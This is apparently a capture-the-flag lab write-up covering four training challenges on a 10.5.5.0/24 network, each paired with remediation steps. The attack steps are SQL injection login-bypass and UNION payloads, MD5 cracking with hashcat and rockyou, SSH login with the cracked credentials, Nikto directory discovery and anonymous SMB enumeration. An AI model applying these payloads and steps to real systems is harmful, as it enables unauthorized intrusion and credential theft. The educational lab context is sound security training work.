# Network & Application Security Assessment Lab
A security assessment in a lab environment, performed from Kali Linux, identified multiple issues including weak authentication, web server misconfigurations, exposed SMB shares, and network security flaws.

## Environment

* Attacker OS: Kali Linux
* Target Network: `10.5.5.0/24`
* Tools Used:

  * Nmap
  * Nikto
  * Hashcat
  * SMBClient
  * Wireshark
  * Web Browser



#Challenge 1: Exploiting Weak Authentication

#Objective

Exploit a vulnerable authentication mechanism to retrieve user credentials and gain system access.


# Step 1: Identify SQL Injection Vulnerability

A SQL injection vulnerability was identified in the login mechanism using the following payload:

```sql
' OR '1'='1
```

This payload bypassed authentication and returned user records from the database.

# Step 2: Extract User Credentials

Using a UNION-based SQL injection:

```sql
' UNION SELECT user, password FROM users-- -
```

Usernames and **MD5 password hashes** were exposed.

# Step 3: Crack Password Hashes

# Command Used

hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt

# Result

5f4dcc3b5aa765d61d8327deb882cf99 → password

# Step 4: SSH Access

### Command Used

ssh smithy@192.168.0.10


# Credentials
Username: smithy
Password: password
# Result

Successful SSH login
Access to user home directory

# Step 5: Flag Discovery

# Command Used
ls


# File Found
my_passwords.txt


Challenge 1 completed .

# Challenge 1 Remediation

1. Use parameterized SQL queries
2. Store passwords using strong hashing algorithms (bcrypt, Argon2)


# Challenge 2: Web Server Vulnerabilities

# Objective

Identify directories with directory listing enabled and retrieve the flag file.
# Step 1: Login & Setup

URL: `http://10.5.5.12`
Credentials: `admin / password`
Security level set to **Low**


# Step 2: Web Server Reconnaissance

# Command Used

nikto -h http://10.5.5.12

# Vulnerable Directories Identified

 `/config/`
 `/docs/`


# Step 3: Directory Enumeration

# URLs Accessed

http://10.5.5.12/config/
http://10.5.5.12/docs/

# Flag Details

* Directory: `/config/`
* Filename: `flag.txt`
* Challenge 2 Code:

aWe-4975



# Challenge 2 Remediation

1. Disable directory indexing (`Options -Indexes`)
2. Restrict directory access using authentication


# Challenge 3: Exploiting Open SMB Server Shares

# Objective

Identify SMB servers, enumerate anonymous shares, and locate the flag file.
# Step 1: SMB Host Discovery

# Command Used

nmap -sS -sV -p 139,445 10.5.5.0/24


# SMB Host Identified

10.5.5.14 (gravemind.pc)

# Step 2: Enumerate SMB Shares

# Command Used

smbclient -L //10.5.5.14 -N


# Shares Found

| Share     | Anonymous Access |
| --------- | ---------------- |
| homes     | No               |
| workfiles | Yes              |
| print$    | Yes              |
| IPC$      | Yes              |

# Step 3: Share Investigation

# Commands Used
smbclient //10.5.5.14/workfiles -N
smbclient //10.5.5.14/print$ -N
smbclient //10.5.5.14/IPC$ -N
No flag file was present in the accessible shares.


# Challenge 3 Remediation

1. Disable anonymous SMB access
2. Restrict SMB access via firewall rules


# Challenge 4: PCAP Analysis

## Objective

Analyze captured network traffic to locate sensitive information transmitted in clear text.


# Step 1: PCAP File Analysis

 File: `~/Downloads/SA.pcap`
 Tool: Wireshark

# Target IP Identified

10.5.5.11

#Directories Revealed

 `/config/`
 `/docs/`


# Step 2: Flag Retrieval
# URL Accessed

http://10.5.5.11/config/flag.txt

# File Content

Challenge 4 Flag
Code: SA-3110


# Challenge 4 Remediation

1. Enforce HTTPS to encrypt traffic
2. Restrict access to sensitive directories

 **Disclaimer:**
All actions were performed in a controlled lab environment for educational purposes only.
